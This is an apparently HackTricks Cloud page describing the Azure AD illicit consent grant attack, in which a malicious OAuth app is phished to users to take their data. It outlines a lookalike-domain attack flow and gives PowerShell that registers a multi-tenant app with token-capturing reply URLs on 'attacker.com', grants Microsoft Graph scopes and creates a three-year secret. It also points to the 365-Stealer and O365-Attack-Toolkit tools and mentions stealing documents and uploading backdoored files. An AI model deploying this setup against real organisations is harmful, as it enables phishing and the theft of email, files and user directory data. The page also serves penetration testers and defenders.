# Az - Illicit Consent Grant

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## OAuth App Phishing

**Azure Applications** ask for permissions to access the **user data** (basic info, but also access to documents, send emails...).\
If **allowed**, a normal user can grant consent only for **"Low Impact" permissions**. In **all other** cases, **admin consent is required**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` and a custom role including `permission to grant permissions to applications` can provide tenant-wide consent.

Only permissions that **doesn't require admin consent** are classified as **low impact**. These are permissions required for **basic sign-in are openid, profile, email, User.Read and offline\_access**. If an **organization** **allows** user consent for **all apps**, an employee can grant consent to an app to **read the above from their profile**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Therefore, an attacker could prepare a **malicious App** and with a **phishing**, make the user **accept the App and steal his data**.

### Check if users allowed to consent

Check if users are allowed to consent to apps:

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **Disable user consent** : Users cannot grant permissions to applications.
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select** : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant
* **Users can consent to all apps** : allows all users to consent to any permission which doesn't require admin consent,
* **Custom app consent policy**

## **What is Illicit Consent Grant Attack?**

In an illicit consent grant attack, the attacker creates an **Azure-registered application that requests access to data such as contact information, email, or documents**. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. After the application has been granted consent, it has user account-level access to the data without the need for an organizational account.

In simple words when the victim clicks on that beautiful blue button of "Accept", Azure AD sends a token to the third party site which belongs to an attacker where attacker will use the token to perform actions on behalf the victims like accessing all the Files, Read Mails, Send Mails etc.

## **Attack Flow**

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

To perform this attack against the company "ecorp" the attacker could registered a domain with name "safedomainlogin.com" and created a subdomain ["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/) where they **hosted the application to capture the authorization code** and then request for the access tokens.

Then, register a Multi Tenant Application in their Azure AD Tenant and named it as "ecorp" and added the Redirect URL that points to the "ecorp.safedomainlogin.com" which host's an application to capture the authorization code.

The attacker also create a new client secret and added few API **permissions** such `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` in the application. So that once the **user grant the consent to the application**, the attacker can **extract** the **sensitive information** on behalf of the user.

The attacker finally creates the **link** that contained the client id of the malicious application and **shared** the link with the **targeted users** to gain their consent.

## 365-Stealer

You can perform this attack with [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

As extra step, if you have some **access over a user in the victim organisation**, you can check if the policy will allow him to **accept to apps**:

```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```

For this attack you will need to create a **new App in your Azure Tenant** (in App registrations) with, for example, the following permissions:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` is inside `Microsoft Graph` in `Delegated permissions`. (Application permissions will always need extra approval).

* `User.ReadBasic.All` is the permission that will allow you to **read information of all the users** in the organization if granted.
* Remember that only `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` and a custom role including `permission to grant permissions to applications` can provide tenant-wide consent. So, you should **phish a user with one of those roles** if you want him to approve an **App that requires admin consent**.

You could also create an App via cli with:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
  $AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
  $AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

  $Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access.Type = "Scope"
  $Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
  $AADAccess.ResourceAccess = @()
  $AADAccess.ResourceAccess.Add($Access)

  $Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access2.Type = "Scope"
  $Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
  $AADAccess.ResourceAccess.Add($Access2)

  $Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access3.Type = "Scope"
  $Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
  $AADAccess.ResourceAccess.Add($Access3)

  $Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access4.Type = "Scope"
  $Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
  $AADAccess.ResourceAccess.Add($Access4)

  $app.RequiredResourceAccess.Add($AADAccess)
} else {
  $Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access.Type = "Scope"
  $Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
  $AADAccess.ResourceAccess = @()
  $AADAccess.ResourceAccess.Add($Access)

  $Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access2.Type = "Scope"
  $Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
  $AADAccess.ResourceAccess.Add($Access2)

  $Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access3.Type = "Scope"
  $Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
  $AADAccess.ResourceAccess.Add($Access3)

  $Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access4.Type = "Scope"
  $Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
  $AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Check [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) to learn how to configure it.

{% hint style="warning" %}
Note that the obtained **access token** will be for the **graph endpoint** with the scopes: `User.Read` and `User.ReadBasic.All` (the requested permissions). You won't be able to performs other actions (but those are enough to **download info about all the users** in the org).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

You could also use this tool to perform this attack.

## Post-Exploitation

Once you got access to the user you can do things such as stealing sensitive documents and even uploading backdoored document files.

## References

* This post was copied from [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
